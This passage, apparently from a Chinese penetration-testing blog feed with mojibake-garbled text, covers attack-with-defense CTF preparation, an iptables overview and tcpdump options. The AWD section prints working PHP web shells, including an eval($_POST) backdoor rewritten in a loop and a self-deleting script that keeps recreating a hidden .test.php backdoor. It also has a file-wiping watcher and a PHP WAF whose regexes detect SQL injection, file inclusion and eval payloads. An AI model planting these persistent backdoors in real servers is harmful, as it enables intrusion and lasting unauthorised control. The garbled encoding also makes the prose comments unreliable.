<span class="hljs-keyword">for</span>(<span class="hljs-variable">$test</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$test</span>&lt;strlen(<span class="hljs-variable">$str</span>);<span class="hljs-variable">$test</span>++)</span><span class="line">    &#123;</span><span class="line">        <span class="hljs-variable">$b</span>=<span class="hljs-variable">$b</span>.(chr(ord(<span class="hljs-variable">$str</span>[<span class="hljs-variable">$test</span>])-<span class="hljs-number">1</span>));</span><span class="line">    &#125;</span><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-variable">$b</span>;</span><span class="line">&#125;</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">echo</span> strrev(decode233(<span class="hljs-variable">$a</span>));</span><span class="line"><span class="hljs-meta">?&gt;</span></span></code></pre></div></div><ul><li>ä»¥ä¸‹æ˜¯ä¸æ­»é©¬<div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-php-template codeBlockLines"><span class="line"><span class="xml">while true;do echo &#x27;</span><span class="php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;x&quot;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="xml">&#x27; &gt; x.php;sleep 1;done</span></span></code></pre></div></div></li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-reasonml codeBlockLines"><span class="line">&lt;?php</span><span class="line">set<span class="hljs-constructor">_time_limit(0)</span>;</span><span class="line"><span class="hljs-comment">//ç¨‹åºæ‰§è¡Œæ—¶é—´</span></span><span class="line">ignore<span class="hljs-constructor">_user_abort(1)</span>;</span><span class="line"><span class="hljs-comment">//å…³æ‰ç»ˆç«¯åè„šæœ¬ä»ç„¶è¿è¡Œ</span></span><span class="line">unlink(__FILE__);</span><span class="line"><span class="hljs-comment">//æ–‡ä»¶å®Œæ•´å</span></span><span class="line"><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>) &#123;</span><span class="line"> file<span class="hljs-constructor">_put_contents(&#x27;.<span class="hljs-params">test</span>.<span class="hljs-params">php</span>&#x27;,&#x27;&lt;?<span class="hljs-params">php</span> $<span class="hljs-params">a</span>=<span class="hljs-params">array</span>($<span class="hljs-params">_REQUEST</span>[<span class="hljs-string">&quot;x&quot;</span>]=&gt;<span class="hljs-string">&quot;3&quot;</span>)</span>;   <span class="hljs-comment">// pwd=x</span></span><span class="line">$b=<span class="hljs-built_in">array</span><span class="hljs-constructor">_keys($<span class="hljs-params">a</span>)</span><span class="hljs-literal">[<span class="hljs-number">0</span>]</span>;</span><span class="line">eval($b);?&gt;&#x27;);</span><span class="line"> sleep(<span class="hljs-number">5</span>);</span><span class="line">&#125;</span><span class="line">?&gt;</span></code></pre></div></div><ul><li>ç”¨shellå»ç›‘æ§å½“å‰ç›®å½•æ˜¯å¦æœ‰æ–°å¢æ–‡ä»¶</li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line"><span class="hljs-meta">#!/bin/bash</span></span><span class="line"><span class="hljs-keyword">while</span> <span class="hljs-literal">true</span></span><span class="line"><span class="hljs-keyword">do</span></span><span class="line">    find /var/www/html/ -cmin -60 -<span class="hljs-built_in">type</span> f | xargs rm -rf</span><span class="line">    sleep 1</span><span class="line"><span class="hljs-keyword">done</span></span></code></pre></div></div><ul><li><a href="https://github.com/admintony/Prepare-for-AWD">AWDæµç¨‹æ¡†æ¶å’Œè„šæœ¬é›†åˆ</a></li></ul><p>waf</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-php codeBlockLines"><span class="line"><span class="hljs-meta">&lt;?php</span></span><span class="line"><span class="hljs-comment">//error_reporting(E_ALL);</span></span><span class="line"><span class="hljs-comment">//ini_set(&#x27;display_errors&#x27;, 1);</span></span><span class="line"><span class="hljs-comment">/*</span></span><span class="line"><span class="hljs-comment">æ£€æµ‹è¯·æ±‚æ–¹å¼ï¼Œé™¤äº†getå’Œpostä¹‹å¤–æ‹¦æˆªä¸‹æ¥å¹¶å†™æ—¥å¿—ã€‚</span></span><span class="line"><span class="hljs-comment">*/</span></span><span class="line"><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] != <span class="hljs-string">&#x27;POST&#x27;</span> &amp;&amp; <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] != <span class="hljs-string">&#x27;GET&#x27;</span>) &#123;</span><span class="line">    write_attack_log(<span class="hljs-string">&quot;method&quot;</span>);</span><span class="line">&#125;</span><span class="line"><span class="hljs-variable">$url</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>]; <span class="hljs-comment">//è·å–uriæ¥è¿›è¡Œæ£€æµ‹</span></span><span class="line"><span class="hljs-variable">$data</span> = file_get_contents(<span class="hljs-string">&#x27;php://input&#x27;</span>); <span class="hljs-comment">//è·å–postçš„dataï¼Œæ— è®ºæ˜¯å¦æ˜¯mutipa</span></span><span class="line">rt <span class="hljs-variable">$headers</span> = get_all_headers(); <span class="hljs-comment">//è·å–header</span></span><span class="line">filter_attack_keyword(filter_invisible(urldecode(filter_0x25(<span class="hljs-variable">$url</span>)))); <span class="hljs-comment">//</span></span><span class="line">å¯¹URLè¿›è¡Œæ£€æµ‹ï¼Œå‡ºç°é—®é¢˜åˆ™æ‹¦æˆªå¹¶è®°å½•filter_attack_keyword(filter_invisible(urldecode(filter_0x25(<span class="hljs-variable">$data</span>))));</span><span class="line"><span class="hljs-comment">//å¯¹POSTçš„å†…å®¹è¿›è¡Œæ£€æµ‹ï¼Œå‡ºç°é—®é¢˜æ‹¦æˆªå¹¶è®°å½•</span></span><span class="line"><span class="hljs-comment">/*</span></span><span class="line"><span class="hljs-comment">æ£€æµ‹è¿‡äº†åˆ™å¯¹è¾“å…¥è¿›è¡Œç®€å•è¿‡æ»¤</span></span><span class="line"><span class="hljs-comment">*/</span></span><span class="line"><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;</span><span class="line">    <span class="hljs-variable">$_GET</span>[<span class="hljs-variable">$key</span>] = filter_dangerous_words(<span class="hljs-variable">$value</span>);</span><span class="line">&#125;</span><span class="line"><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_POST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;</span><span class="line">    <span class="hljs-variable">$_POST</span>[<span class="hljs-variable">$key</span>] = filter_dangerous_words(<span class="hljs-variable">$value</span>);</span><span class="line">&#125;</span><span class="line"><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$headers</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;</span><span class="line">    filter_attack_keyword(filter_invisible(urldecode(filter_0x25(<span class="hljs-variable">$value</span>)))); <span class="hljs-comment">//å¯¹httpè¯·æ±‚å¤´è¿›è¡Œæ£€æµ‹ï¼Œå‡ºç°é—®é¢˜æ‹¦æˆªå¹¶è®°å½•</span></span><span class="line">    <span class="hljs-variable">$_SERVER</span>[<span class="hljs-variable">$key</span>] = filter_dangerous_words(<span class="hljs-variable">$value</span>); <span class="hljs-comment">//ç®€å•è¿‡æ»¤</span></span><span class="line"></br></span><span class="line">&#125;</span><span class="line"><span class="hljs-comment">/*</span></span><span class="line"><span class="hljs-comment">è·å–httpè¯·æ±‚å¤´å¹¶å†™å…¥æ•°ç»„</span></span><span class="line"><span class="hljs-comment">*/</span></span><span class="line"></br>) </span>&#123;</span><span class="line">    <span class="hljs-variable">$headers</span> = <span class="hljs-keyword">array</span>();</span><span class="line">    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_SERVER</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;</span><span class="line">        <span class="hljs-keyword">if</span> (substr(<span class="hljs-variable">$key</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>) === <span class="hljs-string">&#x27;HTTP_&#x27;</span>) &#123;</span><span class="line">            <span class="hljs-variable">$headers</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-variable">$value</span>;</span><span class="line">        &#125;</span><span class="line">    &#125;</span><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-variable">$headers</span>;</span><span class="line">&#125;</span><span class="line"><span class="hljs-comment">/*</span></span><span class="line"><span class="hljs-comment">æ£€æµ‹ä¸å¯è§å­—ç¬¦é€ æˆçš„æˆªæ–­å’Œç»•è¿‡æ•ˆæœï¼Œæ³¨æ„ç½‘ç«™è¯·æ±‚å¸¦ä¸­æ–‡éœ€è¦ç®€å•ä¿®æ”¹</span></span><span class="line"><span class="hljs-comment">*/</span></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter_invisible</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>) </span>&#123;</span><span class="line">    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; strlen(<span class="hljs-variable">$str</span>); <span class="hljs-variable">$i</span>++) &#123;</span><span class="line">        <span class="hljs-variable">$ascii</span> = ord(<span class="hljs-variable">$str</span>[<span class="hljs-variable">$i</span>]);</span><span class="line">        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$ascii</span> &gt; <span class="hljs-number">126</span> || <span class="hljs-variable">$ascii</span> &lt; <span class="hljs-number">32</span>) &#123; <span class="hljs-comment">//æœ‰ä¸­æ–‡è¿™é‡Œè¦ä¿®æ”¹</span></span><span class="line">            <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$ascii</span>, <span class="hljs-keyword">array</span>(</span><span class="line">                <span class="hljs-number">9</span>,</span><span class="line">                <span class="hljs-number">10</span>,</span><span class="line">                <span class="hljs-number">13</span></span><span class="line">            ))) &#123;</span><span class="line">                write_attack_log(<span class="hljs-string">&quot;interrupt&quot;</span>);</span><span class="line">            &#125; <span class="hljs-keyword">else</span> &#123;</span><span class="line">                <span class="hljs-variable">$str</span> = str_replace(<span class="hljs-variable">$ascii</span>, <span class="hljs-string">&quot; &quot;</span>, <span class="hljs-variable">$str</span>);</span><span class="line">            &#125;</span><span class="line">        &#125;</span><span class="line">    &#125;</span><span class="line">    <span class="hljs-variable">$str</span> = str_replace(<span class="hljs-keyword">array</span>(</span><span class="line">        <span class="hljs-string">&quot;`&quot;</span>,</span><span class="line">        <span class="hljs-string">&quot;|&quot;</span>,</span><span class="line">        <span class="hljs-string">&quot;;&quot;</span>,</span><span class="line">        <span class="hljs-string">&quot;,&quot;</span></span><span class="line">    ) , <span class="hljs-string">&quot; &quot;</span>, <span class="hljs-variable">$str</span>);</span><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-variable">$str</span>;</span><span class="line">&#125;</span><span class="line"><span class="hljs-comment">/*</span></span><span class="line"><span class="hljs-comment">æ£€æµ‹ç½‘ç«™ç¨‹åºå­˜åœ¨äºŒæ¬¡ç¼–ç ç»•è¿‡æ¼æ´é€ æˆçš„%25ç»•è¿‡ï¼Œæ­¤å¤„æ˜¯å¾ªç¯å°†%25æ›¿æ¢æˆ%ï¼Œç›´è‡³ä¸å­˜åœ¨%25</span></span><span class="line"><span class="hljs-comment">*/</span></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter_0x25</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>) </span>&#123;</span><span class="line">    <span class="hljs-keyword">if</span> (strpos(<span class="hljs-variable">$str</span>, <span class="hljs-string">&quot;%25&quot;</span>) !== <span class="hljs-literal">false</span>) &#123;</span><span class="line">        <span class="hljs-variable">$str</span> = str_replace(<span class="hljs-string">&quot;%25&quot;</span>, <span class="hljs-string">&quot;%&quot;</span>, <span class="hljs-variable">$str</span>);</span><span class="line">        <span class="hljs-keyword">return</span> filter_0x25(<span class="hljs-variable">$str</span>);</span><span class="line">    &#125; <span class="hljs-keyword">else</span> &#123;</span><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-variable">$str</span>;</span><span class="line">    &#125;</span><span class="line">&#125;</span><span class="line"><span class="hljs-comment">/*</span></span><span class="line"><span class="hljs-comment">æ”»å‡»å…³é”®å­—æ£€æµ‹ï¼Œæ­¤å¤„ç”±äºä¹‹å‰å°†ç‰¹æ®Šå­—ç¬¦æ›¿æ¢æˆç©ºæ ¼ï¼Œå³ä½¿å­˜åœ¨ç»•è¿‡ç‰¹æ€§ä¹Ÿç»•ä¸è¿‡æ­£åˆ™çš„\b</span></span><span class="line"><span class="hljs-comment">*/</span></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter_attack_keyword</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>) </span>&#123;</span><span class="line">    <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/select\b|insert\b|update\b|drop\b|delete\b|dumpfile\b</span></span><span class="line"><span class="hljs-string">|outfile\b|load_file|rename\b|floor\(|extractvalue|updatexml|name_const|m</span></span><span class="line"><span class="hljs-string">ultipoint\(/i&quot;</span>, <span class="hljs-variable">$str</span>)) &#123;</span><span class="line">        write_attack_log(<span class="hljs-string">&quot;sqli&quot;</span>);</span><span class="line">    &#125;</span><span class="line"></br></span><span class="line">    <span class="hljs-keyword">if</span> (substr_count(<span class="hljs-variable">$str</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>]) &lt; <span class="hljs-number">2</span>) &#123;</span><span class="line">        <span class="hljs-variable">$tmp</span> = str_replace(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>], <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$str</span>);</span><span class="line">        <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/\.\.|.*\.php[35]&#123;0,1&#125;/i&quot;</span>, <span class="hljs-variable">$tmp</span>)) &#123;</span><span class="line">            write_attack_log(<span class="hljs-string">&quot;LFI/LFR&quot;</span>);;</span><span class="line">        &#125;</span><span class="line">    &#125; <span class="hljs-keyword">else</span> &#123;</span><span class="line">        write_attack_log(<span class="hljs-string">&quot;LFI/LFR&quot;</span>);</span><span class="line">    &#125;</span><span class="line">    <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/base64_decode|eval\(|assert\(/i&quot;</span>, <span class="hljs-variable">$str</span>)) &#123;</span><span class="line">        write_attack_log(<span class="hljs-string">&quot;EXEC&quot;</span>);</span><span class="line">    &#125;</span><span class="line">    <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$str</span>)) &#123;</span><span class="line">        write_attack_log(<span class="hljs-string">&quot;GETFLAG&quot;</span>);</span><span class="line">    &#125;</span><span class="line">&#125;</span><span class="line"><span class="hljs-comment">/*</span></span><span class="line"><span class="hljs-comment">ç®€å•å°†æ˜“å‡ºç°é—®é¢˜çš„å­—ç¬¦æ›¿æ¢æˆä¸­æ–‡</span></span><span class="line"><span class="hljs-comment">*/</span></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter_dangerous_words</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>) </span>&#123;</span><span class="line">    <span class="hljs-variable">$str</span> = str_replace(<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;â€˜&quot;</span>, <span class="hljs-variable">$str</span>);</span><span class="line">    <span class="hljs-variable">$str</span> = str_replace(<span class="hljs-string">&quot;\&quot;&quot;</span>, <span class="hljs-string">&quot;â€œ&quot;</span>, <span class="hljs-variable">$str</span>);</span><span class="line">    <span class="hljs-variable">$str</span> = str_replace(<span class="hljs-string">&quot;&lt;&quot;</span>, <span class="hljs-string">&quot;ã€Š&quot;</span>, <span class="hljs-variable">$str</span>);</span><span class="line">    <span class="hljs-variable">$str</span> = str_replace(<span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-string">&quot;ã€‹&quot;</span>, <span class="hljs-variable">$str</span>);</span><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-variable">$str</span>;</span><span class="line">&#125;</span><span class="line"><span class="hljs-comment">/*</span></span><span class="line"><span class="hljs-comment">è·å–httpçš„è¯·æ±‚åŒ…ï¼Œæ„ä¹‰åœ¨äºè·å–åˆ«äººçš„æ”»å‡»payload</span></span><span class="line"><span class="hljs-comment">*/</span></span><span class="line"></br>) </span>&#123;</span><span class="line">    <span class="hljs-variable">$raw</span> = <span class="hljs-string">&#x27;&#x27;</span>;</span><span class="line">    <span class="hljs-variable">$raw</span>.= <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] . <span class="hljs-string">&#x27; &#x27;</span> . <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>] . <span class="hljs-string">&#x27; &#x27;</span> . <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;SERVER_PROTOCOL&#x27;</span>] . <span class="hljs-string">&quot;\r\n&quot;</span>;</span><span class="line">    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_SERVER</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;</span><span class="line">        <span class="hljs-keyword">if</span> (substr(<span class="hljs-variable">$key</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>) === <span class="hljs-string">&#x27;HTTP_&#x27;</span>) &#123;</span><span class="line">            <span class="hljs-variable">$key</span> = substr(<span class="hljs-variable">$key</span>, <span class="hljs-number">5</span>);</span><span class="line">            <span class="hljs-variable">$key</span> = str_replace(<span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-string">&#x27;-&#x27;</span>, <span class="hljs-variable">$key</span>);</span><span class="line">            <span class="hljs-variable">$raw</span>.= <span class="hljs-variable">$key</span> . <span class="hljs-string">&#x27;: &#x27;</span> . <span class="hljs-variable">$value</span> . <span class="hljs-string">&quot;\r\n&quot;</span>;</span><span class="line">        &#125;</span><span class="line">    &#125;</span><span class="line">    <span class="hljs-variable">$raw</span>.= <span class="hljs-string">&quot;\r\n&quot;</span>;</span><span class="line">    <span class="hljs-variable">$raw</span>.= file_get_contents(<span class="hljs-string">&#x27;php://input&#x27;</span>);</span><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-variable">$raw</span>;</span><span class="line">&#125;</span><span class="line"><span class="hljs-comment">/*</span></span><span class="line"><span class="hljs-comment">è¿™é‡Œæ‹¦æˆªå¹¶è®°å½•æ”»å‡»payload</span></span><span class="line"><span class="hljs-comment">*/</span></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write_attack_log</span>(<span class="hljs-params"><span class="hljs-variable">$alert</span></span>) </span>&#123;</span><span class="line">    date_default_timezone_set(<span class="hljs-string">&quot;Asia/Shanghai&quot;</span>);</span><span class="line">    <span class="hljs-variable">$data</span> = date(<span class="hljs-string">&quot;Y/m/d H:i:s&quot;</span>) . <span class="hljs-string">&quot; --</span></span><span class="line"><span class="hljs-string">[&quot;</span> . <span class="hljs-variable">$alert</span> . <span class="hljs-string">&quot;]&quot;</span> . <span class="hljs-string">&quot;\r\n&quot;</span> . get_http_raw() . <span class="hljs-string">&quot;\r\n\r\n&quot;</span>;</span><span class="line">    <span class="hljs-variable">$ffff</span> = fopen(<span class="hljs-string">&#x27;log_is_a_secret_file.txt&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>); <span class="hljs-comment">//æ—¥å¿—è·¯å¾„</span></span><span class="line">    fwrite(<span class="hljs-variable">$ffff</span>, <span class="hljs-variable">$data</span>);</span><span class="line">    fclose(<span class="hljs-variable">$ffff</span>);</span><span class="line">    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$alert</span> == <span class="hljs-string">&#x27;GETFLAG&#x27;</span>) &#123;</span><span class="line">        header(<span class="hljs-string">&quot;location:http://172.16.9.2/&quot;</span>);</span><span class="line">    &#125; <span class="hljs-keyword">else</span> &#123;</span><span class="line">        sleep(<span class="hljs-number">15</span>); <span class="hljs-comment">//æ‹¦æˆªå‰å»¶æ—¶15ç§’</span></span><span class="line"></br></span><span class="line">    &#125;</span><span class="line">    <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);</span><span class="line">&#125;</span><span class="line"><span class="hljs-meta">?&gt;</span></span></code></pre></div></div>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€ </category>
          
          <category> checklist </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>linux é˜²ç«å¢™ IPTABLE</title>
      <link href="/2021/12/31/linux-%E9%98%B2%E7%81%AB%E5%A2%99-IPTABLE/"/>
      <url>/2021/12/31/linux-%E9%98%B2%E7%81%AB%E5%A2%99-IPTABLE/</url>
      
        <content type="html"><![CDATA[<h2 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h2><p>iptable å…¶å®æ˜¯netfilterçš„å¯¹å¤–æ¥å£ï¼Œå†…æ ¸é˜²ç«å¢™å…¶å®æ˜¯netfilter</p><p>iptable æœ‰é“¾å’Œè¡¨çš„æ¦‚å¿µï¼Œè¿˜æœ‰åŒ…å¤„äºä»€ä¹ˆä½ç½®</p><p><img src="/2021/12/31/linux-%E9%98%B2%E7%81%AB%E5%A2%99-IPTABLE/1.png"></p><p>è¿™å°±æ˜¯iptableçš„è¿è¡Œå›¾ï¼Œæœ‰5ä¸ªé“¾ï¼š<br><code>prerouting</code> <code>forwording</code> <code>postrouting</code> <code>input</code> <code>output</code></p><p>æœ‰4ä¸ªåŸºæœ¬è¡¨ï¼š<br><code>raw</code> <code>mangle</code> <code>nat</code> <code>filter</code></p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-css codeBlockLines"><span class="line"><span class="hljs-attribute">filter</span>è¡¨ï¼šè´Ÿè´£è¿‡æ»¤åŠŸèƒ½ï¼Œé˜²ç«å¢™ï¼›å†…æ ¸æ¨¡å—ï¼šiptables_filter</span><span class="line"></br></span><span class="line">natè¡¨ï¼šnetwork <span class="hljs-selector-tag">address</span> translationï¼Œç½‘ç»œåœ°å€è½¬æ¢åŠŸèƒ½ï¼›å†…æ ¸æ¨¡å—ï¼šiptable_nat</span><span class="line"></br></span><span class="line">mangleè¡¨ï¼šæ‹†è§£æŠ¥æ–‡ï¼Œåšå‡ºä¿®æ”¹ï¼Œå¹¶é‡æ–°å°è£… çš„åŠŸèƒ½ï¼›iptable_mangle</span><span class="line"></br></span><span class="line">rawè¡¨ï¼šå…³é—­natè¡¨ä¸Šå¯ç”¨çš„è¿æ¥è¿½è¸ªæœºåˆ¶ï¼›iptable_raw</span></code></pre></div></div><h2 id="åŒ¹é…è§„åˆ™"><a href="#åŒ¹é…è§„åˆ™" class="headerlink" title="åŒ¹é…è§„åˆ™"></a>åŒ¹é…è§„åˆ™</h2><p>åŒ¹é…è§„åˆ™åˆ†ä¸ºæ ‡å‡†åŒ¹é…å’Œæ‰©å±•åŒ¹é…ï¼Œä¹Ÿå°±æ˜¯åŸºäºIPå’ŒåŸºäºç«¯å£çš„åŒ¹é…</p><h2 id="åŠ¨ä½œ"><a href="#åŠ¨ä½œ" class="headerlink" title="åŠ¨ä½œ"></a>åŠ¨ä½œ</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-stata codeBlockLines"><span class="line">ACCEPTï¼šå…è®¸æ•°æ®åŒ…é€šè¿‡ã€‚</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">DROP</span>ï¼šç›´æ¥ä¸¢å¼ƒæ•°æ®åŒ…ï¼Œä¸ç»™ä»»ä½•å›åº”ä¿¡æ¯ï¼Œè¿™æ—¶å€™å®¢æˆ·ç«¯ä¼šæ„Ÿè§‰è‡ªå·±çš„è¯·æ±‚æ³¥ç‰›å…¥æµ·äº†ï¼Œè¿‡äº†è¶…æ—¶æ—¶é—´æ‰ä¼šæœ‰ååº”ã€‚</span><span class="line"></br></span><span class="line">REJECTï¼šæ‹’ç»æ•°æ®åŒ…é€šè¿‡ï¼Œå¿…è¦æ—¶ä¼šç»™æ•°æ®å‘é€ç«¯ä¸€ä¸ªå“åº”çš„ä¿¡æ¯ï¼Œå®¢æˆ·ç«¯åˆšè¯·æ±‚å°±ä¼šæ”¶åˆ°æ‹’ç»çš„ä¿¡æ¯ã€‚</span><span class="line"></br></span><span class="line">SNATï¼šæºåœ°å€è½¬æ¢ï¼Œè§£å†³å†…ç½‘ç”¨æˆ·ç”¨åŒä¸€ä¸ªå…¬ç½‘åœ°å€ä¸Šç½‘çš„é—®é¢˜ã€‚</span><span class="line"></br></span><span class="line">MASQUERADEï¼šæ˜¯SNATçš„ä¸€ç§ç‰¹æ®Šå½¢å¼ï¼Œé€‚ç”¨äºåŠ¨æ€çš„ã€ä¸´æ—¶ä¼šå˜çš„ipä¸Šã€‚</span><span class="line"></br></span><span class="line">DNATï¼šç›®æ ‡åœ°å€è½¬æ¢ã€‚</span><span class="line"></br></span><span class="line">REDIRECTï¼šåœ¨æœ¬æœºåšç«¯å£æ˜ å°„ã€‚</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">LOG</span>ï¼šåœ¨/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/messagesæ–‡ä»¶ä¸­è®°å½•æ—¥å¿—ä¿¡æ¯ï¼Œç„¶åå°†æ•°æ®åŒ…ä¼ é€’ç»™ä¸‹ä¸€æ¡è§„åˆ™ï¼Œä¹Ÿå°±æ˜¯è¯´é™¤äº†è®°å½•ä»¥å¤–ä¸å¯¹æ•°æ®åŒ…åšä»»ä½•å…¶ä»–æ“ä½œï¼Œä»ç„¶è®©ä¸‹ä¸€æ¡è§„åˆ™å»åŒ¹é…ã€‚</span></code></pre></div></div><h2 id="å‘½ä»¤"><a href="#å‘½ä»¤" class="headerlink" title="å‘½ä»¤"></a>å‘½ä»¤</h2><ul><li><p>æŸ¥çœ‹</p><ul><li><code>iptables -L</code> é»˜è®¤å°±æ˜¯æŸ¥çœ‹filter è¡¨çš„ INPUT é“¾</li><li><code>iptables -nvL INPUT --line-numbers</code>  æŸ¥çœ‹è¯¦æƒ…</li></ul></li><li><p><a href="http://blog.51yip.com/linux/1404.html">è¿™é‡Œ</a>æ˜¯iptables çš„å¢åˆ æ”¹æŸ¥å‘½ä»¤</p></li></ul><p>æ¸…é™¤è®¡æ•°ä¸º<code>-Z</code></p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€ </category>
          
          <category> çŸ¥è¯†ç‚¹ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>tcpdump å¸¸ç”¨å‚æ•°</title>
      <link href="/2021/12/31/tcpdump-%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0/"/>
      <url>/2021/12/31/tcpdump-%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<p><code>tcpdump tcp -i eth1 -n -t -s 0 -c 100 and dst port ! 22 and src net 192.168.1.0/24 -w ./target.cap</code></p><blockquote><ul><li><p>tcp: ip icmp arp rarp å’Œ tcpã€udpã€icmpè¿™äº›é€‰é¡¹ç­‰éƒ½è¦æ”¾åˆ°ç¬¬ä¸€ä¸ªå‚æ•°çš„ä½ç½®ï¼Œç”¨æ¥è¿‡æ»¤æ•°æ®æŠ¥çš„ç±»å‹</p></li><li><p>-i eth1 : åªæŠ“ç»è¿‡æ¥å£eth1çš„åŒ…</p></li><li><p>-t : ä¸æ˜¾ç¤ºæ—¶é—´æˆ³</p></li><li><p>-s 0 : æŠ“å–æ•°æ®åŒ…æ—¶é»˜è®¤æŠ“å–é•¿åº¦ä¸º68å­—èŠ‚ã€‚åŠ ä¸Š-S 0 åå¯ä»¥æŠ“åˆ°å®Œæ•´çš„æ•°æ®åŒ…</p></li><li><p>-c 100 : åªæŠ“å–100ä¸ªæ•°æ®åŒ…</p></li><li><p>dst port ! 22 : ä¸æŠ“å–ç›®æ ‡ç«¯å£æ˜¯22çš„æ•°æ®åŒ…</p></li><li><p>src net 192.168.1.0/24 : æ•°æ®åŒ…çš„æºç½‘ç»œåœ°å€ä¸º192.168.1.0/24</p></li><li><p>-w ./target.cap : ä¿å­˜æˆcapæ–‡ä»¶ï¼Œæ–¹ä¾¿ç”¨ethereal(å³wireshark)åˆ†æ</p></li><li><p>-n ä¸æ˜¾ç¤ºè§£æåœ°å€</p></li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> å·¥å…· </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sqlmap ç‰¹æ€§</title>
      <link href="/2021/12/31/sqlmap-%E7%89%B9%E6%80%A7/"/>
      <url>/2021/12/31/sqlmap-%E7%89%B9%E6%80%A7/</url>
      
